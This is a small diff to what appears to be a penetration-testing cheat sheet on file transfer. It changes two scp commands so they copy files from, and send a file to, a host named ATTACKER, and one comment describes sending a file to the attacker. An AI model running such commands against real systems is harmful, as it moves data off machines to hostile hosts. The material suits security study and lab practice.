@@ -20,7 +20,7 @@ netstat -lnpt
 
 ```bash
 # We specify the credential and its filepath and the output would be its current dir
-scp user@TARGET:/path/to/file .
+scp user@ATTACKER:/path/to/file .
 ```
 
 ---
@@ -30,6 +30,6 @@ scp user@TARGET:/path/to/file .
 ```bash
 # file is the file name we want to sent to attacker
 # /path/ is the path where it land
-scp file user@TARGET:/path/
+scp file user@ATTACKER:/path/
 ```
 
